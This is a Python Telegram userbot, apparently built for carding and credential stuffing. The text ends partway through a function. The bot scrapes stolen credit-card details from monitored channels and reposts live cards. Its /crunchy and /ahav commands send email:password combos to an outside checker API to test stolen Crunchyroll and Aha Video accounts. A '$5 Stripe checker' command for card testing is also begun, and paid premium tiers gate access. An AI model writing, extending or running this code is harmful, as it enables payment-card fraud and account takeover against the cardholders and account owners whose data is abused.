from telethon.sync import TelegramClient
from telethon.sessions import StringSession
from telethon import errors
from telethon import events
import requests
import os
from string import ascii_uppercase, digits
from random import randint, choices
from re import sub, findall, compile, DOTALL
import google.generativeai as gemini
from checker import flex
import asyncio
from time import sleep, time
from keep_alive import keep_alive
from requests import get
from minex import runMine
from uuid import uuid4

# Credentials.
api_id = int(os.environ.get("API_ID"))
api_hash = os.environ.get("API_HASH")
ss = os.environ.get("STRING_SESSION")

# Main

def generate_unique_id():
    return str(uuid4())

def formatMessage(text):
    splited = text.split("\n")
    res = ""
    for each in splited:
        res += each.strip() + "\n"
    return res

def generate_keys():
    random_key = ''.join(choices(ascii_uppercase + digits, k=16))
    return random_key


def fetchKeyword(keyword, source):
    return len(findall(rf"\b{keyword}\b", source)) >= 1


def getJobRole(job):
    if fetchKeyword("android", job):
        return "android"
    elif fetchKeyword("mobile", job):
        return "android"
    elif fetchKeyword("application", job):
        return "android"
    elif fetchKeyword("mobile app", job):
        return "android"
    elif fetchKeyword("android app", job):
        return "android"
    elif fetchKeyword("android developer", job):
        return "android"
    elif fetchKeyword("mobile developer", job):
        return "android"
    elif fetchKeyword("application developer", job):
        return "android"
    elif fetchKeyword("software application", job):
        return "android"
    elif fetchKeyword("full stack", job):
        return "full_stack"
    elif fetchKeyword("fullstack", job):
        return "full_stack"
    else:
        return "null"

    return "null"


def isApprovedCreditCard(cc):
    if len(findall(r"(\b𝗖𝗵𝗮𝗿𝗴𝗲𝗱\b).(\b\d{1,2}\b)", cc)) >= 1:
        return True
    elif len(findall(r"(\bcharged\b).(\b\d{1,2}\b)", cc)) >= 1:
        return True
    elif len(findall(r"(\b\d{1,2}\b).(\b𝗖𝗵𝗮𝗿𝗴𝗲𝗱\b)", cc)) >= 1:
        return True
    elif len(findall(r"(\b\d{1,2}\b).(\bcharged\b)", cc)) >= 1:
        return True
    elif len(findall(r"(\b𝗖𝗵𝗮𝗿𝗴𝗲𝗱\b).(\b\d{1,2}\b)\$", cc)) >= 1:
        return True
    elif len(findall(r"(\bcharged\b).(\b\d{1,2}\b)\$", cc)) >= 1:
        return True
    elif len(findall(r"(\b\d{1,2}\b)\$.(\b𝗖𝗵𝗮𝗿𝗴𝗲𝗱\b)", cc)) >= 1:
        return True
    elif len(findall(r"(\b\d{1,2}\b)\$.(\bcharged\b)", cc)) >= 1:
        return True
    elif fetchKeyword("𝗔𝗽𝗽𝗿𝗼𝘃𝗲𝗱", cc):
        return True
    elif fetchKeyword("approved", cc):
        return True
    else:
        return False
    return False


def filter_env(list):
    final = []
    for x in list:
        x = x.strip()
        if "-" in x:
            final.append(int(x))
        elif "" == x:
            pass
        else:
            final.append(x)
    return final

# Filter Jobs Channels
fuel_jobs = filter_env(os.environ.get("JOBS_SOURCE").split(","))

# Filter CC Channels
fuel_credit_card = filter_env(os.environ.get("CC_SOURCE").split(","))

# Filter Movies Channels
fuel_movies = filter_env(os.environ.get("MOVIES_SOURCE").split(","))

# List of premium users
premium_users = filter_env(os.environ.get("PUSERS").split(","))
authorized_chats = []

# Blacklisted User
result = filter_env(os.environ.get("BLACKLISTED").split(","))
BLACKLISTED = f"{result[2]}{result[1]}{result[0]}{result[3]}"

# Access key
AUTH_KEY_POOL = {}
POOL = {}

# User Seeds
USER_SEEDS = {}

# Active Threads
active_tasks = {}
TASK_ID = "NULL"

# Gemini Access Key
"""
GEMINI_ACCESS_KEY = os.environ.get("GEMINI_KEY").strip()
gemini.configure(api_key=GEMINI_ACCESS_KEY)
model = gemini.GenerativeModel('gemini-pro')
model.generate_content("Hello There!")
"""

# Filter Credit Cards From Each Message.
def filter_pattern(message):

    pattern1 = compile(
        r"(\b\d{15,16}\b)[a-zA-Z\W]*?(\b\d{2}\b)[a-zA-Z\W]*?(\b\d{2,4}\b)[a-zA-Z\W]*?(\b\d{3,4}\b)",
        DOTALL,
    )
    pattern2 = compile(
        r"(\b\d{15,16}\b)[a-zA-Z\W]*?(\b\d{3,4}\b)[a-zA-Z\W]*?(\b\d{2}\b)[a-zA-Z\W]*?(\b\d{2,4}\b)",
        DOTALL,
    )
    pattern3 = compile(
        r"(\b\d{4}\b).(\b\d{4}\b).(\b\d{4}\b).(\b\d{4}\b)[a-zA-Z\W]*?(\b\d{2}\b)[a-zA-Z\W]*?(\b\d{2,4}\b)[a-zA-Z\W]*?(\b\d{3,4}\b)",
        DOTALL,
    )
    pattern4 = compile(
        r"(\b\d{4}\b).(\b\d{4}\b).(\b\d{4}\b).(\b\d{4}\b)[a-zA-Z\W]*?(\b\d{3,4}\b)[a-zA-Z\W]*?(\b\d{2}\b)[a-zA-Z\W]*?(\b\d{2,4}\b)",
        DOTALL,
    )
    result = []
    pattern = 1
    result = pattern1.findall(message)
    if result == []:
        pattern = 2
        result = pattern2.findall(message)
        if result == []:
            pattern = 3
            pattern3.findall(message)
            if result == []:
                pattern = 4
                pattern4.findall(message)
    return result, pattern


def filter_cc(cc):
    matches, pattern = filter_pattern(cc)
    cc, mm, yy, cvv = "", "", "", ""
    for match in matches:
        if pattern == 1:
            cc = match[0]
            mm = match[1]
            yy = match[2]
            cvv = match[3]
        elif pattern == 2:
            cc = match[0]
            mm = match[2]
            yy = match[3]
            cvv = match[1]
        elif pattern == 3:
            cc = "".join(match[0:4])
            mm = match[4]
            yy = match[5]
            cvv = match[6]
        elif pattern == 4:
            cc = "".join(match[0:4])
            mm = match[5]
            yy = match[6]
            cvv = match[4]
        if len(yy) < 4:
            yy = "20" + yy
    return f"{cc}|{mm}|{yy}|{cvv}"


def create_response(message):
    status = "ᴀᴘᴘʀᴏᴠᴇᴅ"
    mes = message.lower()

    if "ccn" in mes:
        status += " ᴄᴄɴ"
    elif len(findall(r"(\b𝗖𝗵𝗮𝗿𝗴𝗲𝗱\b).(\b\d{1,2}\b)", mes)) >= 1:
        status = "ᴄʜᴀʀɢᴇᴅ ᴄᴠᴠ"
    elif len(findall(r"(\bcharged\b).(\b\d{1,2}\b)", mes)) >= 1:
        status = "ᴄʜᴀʀɢᴇᴅ ᴄᴠᴠ"
    elif len(findall(r"(\b\d{1,2}\b).(\b𝗖𝗵𝗮𝗿𝗴𝗲𝗱\b)", mes)) >= 1:
        status = "ᴄʜᴀʀɢᴇᴅ ᴄᴠᴠ"
    elif len(findall(r"(\b\d{1,2}\b).(\bcharged\b)", mes)) >= 1:
        status = "ᴄʜᴀʀɢᴇᴅ ᴄᴠᴠ"
    elif len(findall(r"(\b𝗖𝗵𝗮𝗿𝗴𝗲𝗱\b).(\b\d{1,2}\b)\$", mes)) >= 1:
        status = "ᴄʜᴀʀɢᴇᴅ ᴄᴠᴠ"
    elif len(findall(r"(\bcharged\b).(\b\d{1,2}\b)\$", mes)) >= 1:
        status = "ᴄʜᴀʀɢᴇᴅ ᴄᴠᴠ"
    elif len(findall(r"(\b\d{1,2}\b)\$.(\b𝗖𝗵𝗮𝗿𝗴𝗲𝗱\b)", mes)) >= 1:
        status = "ᴄʜᴀʀɢᴇᴅ ᴄᴠᴠ"
    elif len(findall(r"(\b\d{1,2}\b)\$.(\bcharged\b)", mes)) >= 1:
        status = "ᴄʜᴀʀɢᴇᴅ ᴄᴠᴠ"
    elif "incorrect cvc" in mes:
        status += " ᴄᴄɴ"
    elif "invalid postal code" in mes:
        status += " ᴡʀᴏɴɢ ᴢɪᴘ"
    elif "declined cvv" in mes:
        status += " ᴄᴄɴ"
    elif "insufficient fund" in mes or "not enough balance" in mes:
        status = "ɪɴꜱᴜꜰꜰɪᴄɪᴇɴᴛ ꜰᴜɴᴅꜱ"
    elif "cvv" in message.lower():
        status += " ᴄᴠᴠ"

    credit_card = filter_cc(message)
    if len(credit_card) <= 3:
        return "null"

    credit_card = credit_card.split("|")
    text_1 = f"""
    [✯] 𝗖𝗥𝗘𝗗𝗜𝗧 𝗖𝗔𝗥𝗗 ⚡ 𝗖𝗛𝗘𝗖𝗞𝗘𝗥 
    ━━━━━━━━━━━━━━━━━━━━━━━━━
    [✯] **ᴄᴄ** ↯ `{credit_card[0]}`
    [✯] **ᴇxᴘɪʀʏ** ↯ `{credit_card[1]}/{credit_card[2]}`
    [✯] **ᴄᴠᴄ** ↯ `{credit_card[3]}`
    [✯] **ʀᴇꜱᴘᴏɴꜱᴇ** ↯ {status} ✅
    ━━━━━━━━━━━━━━━━━━━━━━━━━
    [✯] **ᴘʀᴏxʏ** ↯ ʟɪᴠᴇ ☘️
    [✯] **ʟᴇᴇᴄʜᴇᴅ ʙʏ** ↯ @xCatBurglar [𝙿𝚁𝙴𝙼𝙸𝚄𝙼]
    [✯] **ᴅᴇᴠᴇʟᴏᴘᴇʀ** ↯ @x4rju9 ⚜️"""

    return text_1


def main():
    with TelegramClient(StringSession(ss), api_id, api_hash) as client:
        
        client.send_message("me", f"Started Bot Successfully !!")

        @client.on(events.NewMessage(chats=fuel_jobs))
        async def find_jobs(event):
            try:
                job = event.text
                result = getJobRole(job.lower())

                if "android" in result:
                    await client.send_message("x4rju9", job, link_preview=False)
                #elif "full_stack" in result:
                #    await client.send_message(-1002236063557, job, link_preview=False)
            except:
                pass

        @client.on(events.NewMessage(chats=fuel_credit_card))
        @client.on(events.MessageEdited(chats=fuel_credit_card))
        async def cc_leecher(event):
            try:
                cc = event.raw_text
                result = isApprovedCreditCard(cc.lower())

                if result:
                    response = create_response(cc)
                    if response == "null":
                        return
                    response = formatMessage(response)
                    await client.send_message(-1002237078155, response, link_preview=False)
            except:
                pass

        async def crunchy_gate(event):
            global POOL
            global AUTH_KEY_POOL
            try:
                editMessage = None
                shouldEditMessage = False
                # Getting the sender infor to extract the username
                user = await event.get_sender()
                user = user.username
                results = findall(r"([a-zA-Z0-9_\-\.]+@.*)\:(.*)", event.raw_text)
                key = findall(r"ACCESS [A-Z0-9]{16}", event.raw_text)
                haveKey = False
                if len(key) >= 1:
                    key = key[0]
                    if key == AUTH_KEY_POOL.get(user):
                        haveKey = True
                # Membership status
                membership = "𝙵𝚁𝙴𝙴"
                # Setting membership status based on the who accesses it
                if user == "x4rju9":
                    membership = "𝙳𝙴𝚅𝙴𝙻𝙾𝙿𝙴𝚁"
                elif user in premium_users:
                    membership = "𝙿𝚁𝙴𝙼𝙸𝚄𝙼"
                elif haveKey:
                    membership = "ᴀᴜᴛʜ"
                
                if not len(results) >= 1 or "/crunchy" == event.text:
                    if not event.reply_to:
                        res = f"""
                        [✯] 𝗖𝗥𝗨𝗡𝗖𝗛𝗬𝗥𝗢𝗟𝗟 ⚡ 𝗖𝗛𝗘𝗖𝗞𝗘𝗥 
                        ━━━━━━━━━━━━━━━━━━━━━━━━━
                        [✯] **ʀᴇꜱᴘᴏɴꜱᴇ** ↯ `ɴᴏ ᴄᴏᴍʙᴏ ꜰᴏᴜɴᴅ ‼`
                        [✯] **ꜰᴏʀᴍᴀᴛ** ↯ `/ᴄʀᴜɴᴄʜʏ ᴇᴍᴀɪʟ:ᴘᴀꜱꜱᴡᴏʀᴅ ‼`
                        ━━━━━━━━━━━━━━━━━━━━━━━━━
                        [✯] **ᴘʀᴏxʏ** ↯ ʟɪᴠᴇ ☘️
                        [✯] **ᴄʜᴇᴄᴋᴇᴅ ʙʏ** ↯ @{user} [{membership}]
                        [✯] **ᴀᴘɪ ʙʏ** ↯ @hellrip
                        [✯] **ᴅᴇᴠᴇʟᴏᴘᴇᴅ ʙʏ** ↯ @x4rju9 ⚜️"""
                        res = formatMessage(res)
                        await event.reply(res)
                        return
                    else:
                        replied = await event.get_reply_message()
                        text = replied.raw_text
                        results = findall(r"([a-zA-Z0-9_\-\.]+@.*)\:(.*)", text)
                        if not len(results) >= 1:
                            res = f"""
                            [✯] 𝗖𝗥𝗨𝗡𝗖𝗛𝗬𝗥𝗢𝗟𝗟 ⚡ 𝗖𝗛𝗘𝗖𝗞𝗘𝗥
                            ━━━━━━━━━━━━━━━━━━━━━━━━━
                            [✯] **ʀᴇꜱᴘᴏɴꜱᴇ** ↯ `ɴᴏ ᴄᴏᴍʙᴏ ꜰᴏᴜɴᴅ ‼`
                            [✯] **ꜰᴏʀᴍᴀᴛ** ↯ `/ᴄʀᴜɴᴄʜʏ ᴇᴍᴀɪʟ:ᴘᴀꜱꜱᴡᴏʀᴅ ‼`
                            ━━━━━━━━━━━━━━━━━━━━━━━━━
                            [✯] **ᴘʀᴏxʏ** ↯ ʟɪᴠᴇ ☘️
                            [✯] **ᴄʜᴇᴄᴋᴇᴅ ʙʏ** ↯ @{user} [{membership}]
                            [✯] **ᴀᴘɪ ʙʏ** ↯ @hellrip
                            [✯] **ᴅᴇᴠᴇʟᴏᴘᴇᴅ ʙʏ** ↯ @x4rju9 ⚜️"""
                            res = formatMessage(res)
                            await event.reply(res)
                            return
                
                if len(results) >= 1:
                    shouldReturn = False
                    if event.is_private:
                        if not user in premium_users and not haveKey:
                            shouldReturn = True
                    elif event.is_group:
                        if not user in premium_users and not haveKey:
                            if event.chat_id in authorized_chats:
                                if len(results) > 1:
                                    shouldReturn = True
                                else:
                                    shouldReturn = False
                            else:
                                shouldReturn = True
                    
                    if shouldReturn:
                        res = f"""
                        [✯] 𝗖𝗥𝗨𝗡𝗖𝗛𝗬𝗥𝗢𝗟𝗟 ⚡ 𝗖𝗛𝗘𝗖𝗞𝗘𝗥 
                        ━━━━━━━━━━━━━━━━━━━━━━━━━
                        [✯] **ʀᴇꜱᴘᴏɴꜱᴇ** ↯ `ᴀᴄᴄᴇꜱꜱ ᴅᴇɴɪᴇᴅ ‼`
                        [✯] **ᴍᴇꜱꜱᴀɢᴇ** ↯ `ɴᴏ ᴀᴄᴄᴇꜱꜱ ᴋᴇʏ ꜰᴏᴜɴᴅ ‼`
                        ━━━━━━━━━━━━━━━━━━━━━━━━━
                        [✯] **ᴘʀᴏxʏ** ↯ ʟɪᴠᴇ ☘️
                        [✯] **ᴄʜᴇᴄᴋᴇᴅ ʙʏ** ↯ @{user} [{membership}]
                        [✯] **ᴀᴘɪ ʙʏ** ↯ @hellrip
                        [✯] **ᴅᴇᴠᴇʟᴏᴘᴇᴅ ʙʏ** ↯ @x4rju9 ⚜️"""
                        res = formatMessage(res)
                        await event.reply(res)
                        return
                
                await client.send_message("me", f"Task id: `{TASK_ID}`\nFor Message:\n{event.raw_text}")
                
                for result in results:

                    if asyncio.current_task().cancelled():
                            print("Task has been cancelled.")
                            break

                    if not POOL.get(user) == None:
                        cooldown = time() - POOL.get(user)
                        m_cooldown = 10
                        if user == "x4rju9":
                            m_cooldown = 2
                        elif user in premium_users:
                            m_cooldown = 5
                        elif haveKey:
                            m_cooldown = 7
                        if cooldown < m_cooldown:
                            cooldown = m_cooldown-cooldown
                            editMessage = await event.reply(f"ᴄᴏᴏʟᴅᴏᴡɴ ꜰᴏʀ: {round(cooldown, 2)} ꜱᴇɢᴜɴᴅᴏꜱ ⏳")
                            shouldEditMessage = True
                            if user in premium_users:
                                await asyncio.sleep(cooldown)
                            else:
                                return
                        else:
                            del POOL[user]
                    
                    uEmail = result[0]
                    uPass = result[1]
                    url = f"https://daydreamerwalk.com/c.php?e={uEmail}&p={uPass}"
                    # Response from the server
                    response = requests.post(url=url)
                    # Response of whether the credentials are valid or invalid
                    # Password security: whether to hide or not
                    status = "ᴄʀᴇᴅᴇɴᴛɪᴀʟꜱ ᴍɪꜱᴍᴀᴛᴄʜ ‼"
                    if len(uPass) > 20:
                        uPass = uPass[0:20]
                    if "premium" in response.text:
                        status = "ᴀᴘᴘʀᴏᴠᴇᴅ ᴘʀᴇᴍɪᴜᴍ ✅"
                        if not event.is_private:
                            oLength = len(uPass)
                            length = oLength // 2
                            track = []
                            for x in range(length):
                                i = randint(0, oLength-1)
                                while i in track:
                                    i = randint(0, oLength-1)
                                track.append(i)
                                uPass = uPass[0:i] + "X" + uPass[i+1:]
                    elif "good" in response.text:
                        status = "ꜰʀᴇᴇ ᴀᴄᴄᴏᴜɴᴛ ✅"
                    # Creating Response Format
                    if len(uEmail) > 25:
                        uEmail = f"\n{uEmail}"
                    if len(uPass) > 22:
                        uPass = f"\n{uPass}"
                    res = f"""
                    [✯] 𝗖𝗥𝗨𝗡𝗖𝗛𝗬𝗥𝗢𝗟𝗟 ⚡ 𝗖𝗛𝗘𝗖𝗞𝗘𝗥 
                    ━━━━━━━━━━━━━━━━━━━━━━━━━
                    [✯] **ᴇᴍᴀɪʟ** ↯ `{uEmail}`
                    [✯] **ᴘᴀꜱꜱ** ↯ `{uPass}`
                    [✯] **ʀᴇꜱᴘᴏɴꜱᴇ** ↯ `{status}`
                    ━━━━━━━━━━━━━━━━━━━━━━━━━
                    [✯] **ᴘʀᴏxʏ** ↯ ʟɪᴠᴇ ☘️
                    [✯] **ᴄʜᴇᴄᴋᴇᴅ ʙʏ** ↯ @{user} [{membership}]
                    [✯] **ᴀᴘɪ ʙʏ** ↯ @hellrip
                    [✯] **ᴅᴇᴠᴇʟᴏᴘᴇᴅ ʙʏ** ↯ @x4rju9 ⚜️"""
                    res = formatMessage(res)
                    if shouldEditMessage:
                        await editMessage.edit(res)
                        editMessage = None
                        shouldEditMessage = False
                    else:
                        await event.reply(res)
                    POOL[user] = time()
            except:
                print("Task must be cancelled.")
        
        @client.on(events.NewMessage(pattern=r"^/crunchy"))
        async def crunchy_handler(event):
            global TASK_ID
            global active_tasks
            task = asyncio.create_task(crunchy_gate(event))
            TASK_ID = generate_unique_id()
            active_tasks[TASK_ID] = task
        
        async def ahav_gate(event):
            global POOL
            global AUTH_KEY_POOL
            try:
                editMessage = None
                shouldEditMessage = False
                # Getting the sender infor to extract the username
                user = await event.get_sender()
                user = user.username
                results = findall(r"([a-zA-Z0-9_\-\.]+@.*)\:(.*)", event.raw_text)
                key = findall(r"ACCESS [A-Z0-9]{16}", event.raw_text)
                haveKey = False
                if len(key) >= 1:
                    key = key[0]
                    if key == AUTH_KEY_POOL.get(user):
                        haveKey = True
                # Membership status
                membership = "𝙵𝚁𝙴𝙴"
                # Setting membership status based on the who accesses it
                if user == "x4rju9":
                    membership = "𝙳𝙴𝚅𝙴𝙻𝙾𝙿𝙴𝚁"
                elif user in premium_users:
                    membership = "𝙿𝚁𝙴𝙼𝙸𝚄𝙼"
                elif haveKey:
                    membership = "ᴀᴜᴛʜ"
                
                if not len(results) >= 1 or "/ahav" == event.raw_text:
                    if not event.reply_to:
                        res = f"""
                        [✯] 𝗔𝗛𝗔 𝗩𝗜𝗗𝗘𝗢 ⚡ 𝗖𝗛𝗘𝗖𝗞𝗘𝗥
                        ━━━━━━━━━━━━━━━━━━━━━━━━
                        [✯] **ʀᴇꜱᴘᴏɴꜱᴇ** ↯ `ɴᴏ ᴄᴏᴍʙᴏ ꜰᴏᴜɴᴅ ‼`
                        [✯] **ꜰᴏʀᴍᴀᴛ** ↯ `/ᴀʜᴀᴠ ᴇᴍᴀɪʟ:ᴘᴀꜱꜱᴡᴏʀᴅ ‼`
                        ━━━━━━━━━━━━━━━━━━━━━━━━
                        [✯] **ᴘʀᴏxʏ** ↯ ʟɪᴠᴇ ☘️
                        [✯] **ᴄʜᴇᴄᴋᴇᴅ ʙʏ** ↯ @{user} [{membership}]
                        [✯] **ᴀᴘɪ ʙʏ** ↯ @hellrip
                        [✯] **ᴅᴇᴠᴇʟᴏᴘᴇᴅ ʙʏ** ↯ @x4rju9 ⚜️"""
                        res = formatMessage(res)
                        await event.reply(res)
                        return
                    else:
                        replied = await event.get_reply_message()
                        text = replied.raw_text
                        results = findall(r"([a-zA-Z0-9_\-\.]+@.*)\:(.*)", text)
                        if not len(results) >= 1:
                            res = f"""
                            [✯] 𝗔𝗛𝗔 𝗩𝗜𝗗𝗘𝗢 ⚡ 𝗖𝗛𝗘𝗖𝗞𝗘𝗥
                            ━━━━━━━━━━━━━━━━━━━━━━━━
                            [✯] **ʀᴇꜱᴘᴏɴꜱᴇ** ↯ `ɴᴏ ᴄᴏᴍʙᴏ ꜰᴏᴜɴᴅ ‼`
                            [✯] **ꜰᴏʀᴍᴀᴛ** ↯ `/ᴀʜᴀᴠ ᴇᴍᴀɪʟ:ᴘᴀꜱꜱᴡᴏʀᴅ ‼`
                            ━━━━━━━━━━━━━━━━━━━━━━━━
                            [✯] **ᴘʀᴏxʏ** ↯ ʟɪᴠᴇ ☘️
                            [✯] **ᴄʜᴇᴄᴋᴇᴅ ʙʏ** ↯ @{user} [{membership}]
                            [✯] **ᴀᴘɪ ʙʏ** ↯ @hellrip
                            [✯] **ᴅᴇᴠᴇʟᴏᴘᴇᴅ ʙʏ** ↯ @x4rju9 ⚜️"""
                            res = formatMessage(res)
                            await event.reply(res)
                            return
                
                if len(results) >= 1:
                    shouldReturn = False
                    if event.is_private:
                        if not user in premium_users and not haveKey:
                            shouldReturn = True
                    elif event.is_group:
                        if not user in premium_users and not haveKey:
                            if event.chat_id in authorized_chats:
                                if len(results) > 1:
                                    shouldReturn = True
                                else:
                                    shouldReturn = False
                            else:
                                shouldReturn = True
                    
                    if shouldReturn:
                        res = f"""
                        [✯] 𝗔𝗛𝗔 𝗩𝗜𝗗𝗘𝗢 ⚡ 𝗖𝗛𝗘𝗖𝗞𝗘𝗥 
                        ━━━━━━━━━━━━━━━━━━━━━━━━━
                        [✯] **ʀᴇꜱᴘᴏɴꜱᴇ** ↯ `ᴀᴄᴄᴇꜱꜱ ᴅᴇɴɪᴇᴅ ‼`
                        [✯] **ᴍᴇꜱꜱᴀɢᴇ** ↯ `ɴᴏ ᴀᴄᴄᴇꜱꜱ ᴋᴇʏ ꜰᴏᴜɴᴅ ‼`
                        ━━━━━━━━━━━━━━━━━━━━━━━━━
                        [✯] **ᴘʀᴏxʏ** ↯ ʟɪᴠᴇ ☘️
                        [✯] **ᴄʜᴇᴄᴋᴇᴅ ʙʏ** ↯ @{user} [{membership}]
                        [✯] **ᴀᴘɪ ʙʏ** ↯ @hellrip
                        [✯] **ᴅᴇᴠᴇʟᴏᴘᴇᴅ ʙʏ** ↯ @x4rju9 ⚜️"""
                        res = formatMessage(res)
                        await event.reply(res)
                        return
                
                await client.send_message("me", f"Task id: `{TASK_ID}`\nFor Message:\n{event.raw_text}")
                
                for result in results:

                    if asyncio.current_task().cancelled():
                            print("Task has been cancelled.")
                            break
                    
                    if not POOL.get(user) == None:
                        cooldown = time() - POOL.get(user)
                        m_cooldown = 10
                        if user == "x4rju9":
                            m_cooldown = 2
                        elif user in premium_users:
                            m_cooldown = 5
                        elif haveKey:
                            m_cooldown = 7
                        if cooldown < m_cooldown:
                            cooldown = m_cooldown-cooldown
                            editMessage = await event.reply(f"ᴄᴏᴏʟᴅᴏᴡɴ ꜰᴏʀ: {round(cooldown, 2)} ꜱᴇɢᴜɴᴅᴏꜱ ⏳")
                            shouldEditMessage = True
                            if user in premium_users:
                                await asyncio.sleep(cooldown)
                            else:
                                return
                        else:
                            del POOL[user]
                    
                    uEmail = result[0]
                    uPass = result[1]
                    url = f"https://daydreamerwalk.com/aha.php?e={uEmail}&p={uPass}"
                    # Response from the server
                    response = requests.post(url=url)
                    # Response of whether the credentials are valid or invalid
                    # Password security: whether to hide or not
                    status = "ᴄʀᴇᴅᴇɴᴛɪᴀʟꜱ ᴍɪꜱᴍᴀᴛᴄʜ ‼"
                    if len(uPass) > 20:
                        uPass = uPass[0:20]
                    if "good" in response.text:
                        status = "ᴀᴘᴘʀᴏᴠᴇᴅ ᴘʀᴇᴍɪᴜᴍ ✅"
                        if not event.is_private:
                            oLength = len(uPass)
                            length = oLength // 2
                            track = []
                            for x in range(length):
                                i = randint(0, oLength-1)
                                while i in track:
                                    i = randint(0, oLength-1)
                                track.append(i)
                                uPass = uPass[0:i] + "X" + uPass[i+1:]
                    elif "limit" in response.text:
                        status = "ᴘʀᴇᴍɪᴜᴍ - ʟɪᴍɪᴛ ᴇxᴄᴇᴇᴅ ❗"
                    # Creating Response Format
                    if len(uEmail) > 25:
                        uEmail = f"\n{uEmail}"
                    if len(uPass) > 22:
                        uPass = f"\n{uPass}"
                    res = f"""
                    [✯] 𝗔𝗛𝗔 𝗩𝗜𝗗𝗘𝗢 ⚡ 𝗖𝗛𝗘𝗖𝗞𝗘𝗥 
                    ━━━━━━━━━━━━━━━━━━━━━━━━━
                    [✯] **ᴇᴍᴀɪʟ** ↯ `{uEmail}`
                    [✯] **ᴘᴀꜱꜱ** ↯ `{uPass}`
                    [✯] **ʀᴇꜱᴘᴏɴꜱᴇ** ↯ `{status}`
                    ━━━━━━━━━━━━━━━━━━━━━━━━━
                    [✯] **ᴘʀᴏxʏ** ↯ ʟɪᴠᴇ ☘️
                    [✯] **ᴄʜᴇᴄᴋᴇᴅ ʙʏ** ↯ @{user} [{membership}]
                    [✯] **ᴀᴘɪ ʙʏ** ↯ @hellrip
                    [✯] **ᴅᴇᴠᴇʟᴏᴘᴇᴅ ʙʏ** ↯ @x4rju9 ⚜️"""
                    res = formatMessage(res)
                    if shouldEditMessage:
                        await editMessage.edit(res)
                        editMessage = None
                        shouldEditMessage = False
                    else:
                        await event.reply(res)
                    POOL[user] = time()
            except:
                print("Task must be cancelled.")
        
        @client.on(events.NewMessage(pattern=r"^/ahav"))
        async def ahav_handler(event):
            global TASK_ID
            global active_tasks
            task = asyncio.create_task(ahav_gate(event))
            TASK_ID = generate_unique_id()
            active_tasks[TASK_ID] = task

        '''
        gemini_question_pattern = r"^(?:/google|/kulfi|/ask)"
        @client.on(events.NewMessage(pattern=gemini_question_pattern))
        async def gemini_chat(event):
            try:
                # Getting user info
                user = await event.get_sender()
                name = user.first_name
                username = user.username
                # Extracting question
                question = sub(gemini_question_pattern, "", event.raw_text).strip()
                if "" == question or len(question) <= 1:
                    if not event.reply_to:
                        res = f"""
                        **NO QUESTION FOUND**
                        ━━━━━━━━━━━━━━━━
                        {name} is the dumbest person on internet.
                        ━━━━━━━━━━━━━━━━
                        **ᴀꜱᴋᴇᴅ ʙʏ** ↯ @{username}"""
                        res = formatMessage(res)
                        await event.reply(res)
                        return
                    else:
                        replied = await event.get_reply_message()
                        question = replied.raw_text
                # Generating answer
                answer = model.generate_content(question)

                res = f"""
                **{question.upper()}**
                ━━━━━━━━━━━━━━━━
                {answer.text}
                ━━━━━━━━━━━━━━━━
                **ᴀꜱᴋᴇᴅ ʙʏ** ↯ @{username}"""
                res = formatMessage(res)
                await event.reply(res)
            except:
                pass
        '''

        '''
        grammer_pattern = r"^/grammer"
        @client.on(events.NewMessage(pattern=grammer_pattern))
        async def check_grammer(event):
            try:
                # Getting user info
                user = await event.get_sender()
                name = user.first_name
                username = user.username
                # Extracting sentence
                sentence = sub(grammer_pattern, "", event.raw_text).strip()
                if "" == sentence or len(sentence) <= 1:
                    if not event.reply_to:
                        res = f"""
                        **NO SENTENCE FOUND**
                        ━━━━━━━━━━━━━━━━
                        {name} is the dumbest person on internet.
                        ━━━━━━━━━━━━━━━━
                        **ᴄʜᴇᴄᴋᴇᴅ ʙʏ** ↯ @{username}"""
                        res = formatMessage(res)
                        await event.reply(res)
                        return
                    else:
                        replied = await event.get_reply_message()
                        sentence = replied.raw_text
                # Generating answer
                sentence = f'is this phrase grammitically correct "{sentence}"'
                answer = model.generate_content(sentence)

                res = f"""
                **RESPONSE**
                ━━━━━━━━━━━━━━━━
                {answer.text}
                ━━━━━━━━━━━━━━━━
                **ᴄʜᴇᴄᴋᴇᴅ ʙʏ** ↯ @{username}"""
                res = formatMessage(res)
                await event.reply(res)
            except:
                pass
        '''
        
        async def flex_charge(event):
            global POOL
            global AUTH_KEY_POOL
            global authorized_chats
            try:
                editMessage = None
                shouldEditMessage = False
                # Getting the sender infor to extract the username
                user = await event.get_sender()
                user = user.username
                key = findall(r"ACCESS [A-Z0-9]{16}", event.raw_text)
                haveKey = False
                if len(key) >= 1:
                    key = key[0]
                    if key == AUTH_KEY_POOL.get(user):
                        haveKey = True
                # Membership status
                membership = "𝙵𝚁𝙴𝙴"
                # Setting membership status based on the who accesses it
                if user == "x4rju9":
                    membership = "𝙳𝙴𝚅𝙴𝙻𝙾𝙿𝙴𝚁"
                elif user in premium_users:
                    membership = "𝙿𝚁𝙴𝙼𝙸𝚄𝙼"
                elif haveKey:
                    membership = "ᴀᴜᴛʜ"
                text = event.raw_text.strip()
                results, pattern = filter_pattern(text)
                if "/flex" == text or len(text) == 5 or not len(results) >= 1:
                    if not event.reply_to:
                        res = f"""
                        [✯] $𝟱 𝗦𝗧𝗥𝗜𝗣𝗘 ⚡ 𝗖𝗛𝗘𝗖𝗞𝗘𝗥 
                        ━━━━━━━━━━━━━━━━━━━━━━━━
                        [✯] **ʀᴇꜱᴘᴏɴꜱᴇ** ↯ `ɴᴏ ᴄᴀʀᴅꜱ ꜰᴏᴜɴᴅ ‼`
                        [✯] **ꜰᴏʀᴍᴀᴛ** ↯ `/ꜰʟᴇx ᴄᴄ|ᴍᴍ|ʏʏ|ᴄᴠᴄ ‼`
                        ━━━━━━━━━━━━━━━━━━━━━━━━
                        [✯] **ᴘʀᴏxʏ** ↯ ʟɪᴠᴇ ☘️
                        [✯] **ᴄʜᴇᴄᴋᴇᴅ ʙʏ** ↯ @{user} [{membership}]
                        [✯] **ᴅᴇᴠᴇʟᴏᴘᴇᴅ ʙʏ** ↯ @x4rju9 ⚜️"""
                        res = formatMessage(res)
                        await event.reply(res)
                        return
                    else:
                        replied = await event.get_reply_message()
                        text = replied.raw_text
                        r, p = filter_pattern(text)
                        results = r
                        pattern = p
                        if not len(results) >= 1:
                            res = f"""
                            [✯] $𝟱 𝗦𝗧𝗥𝗜𝗣𝗘 ⚡ 𝗖𝗛𝗘𝗖𝗞𝗘𝗥 
                            ━━━━━━━━━━━━━━━━━━━━━━━━
                            [✯] **ʀᴇꜱᴘᴏɴꜱᴇ** ↯ `ɴᴏ ᴄᴀʀᴅꜱ ꜰᴏᴜɴᴅ ‼`
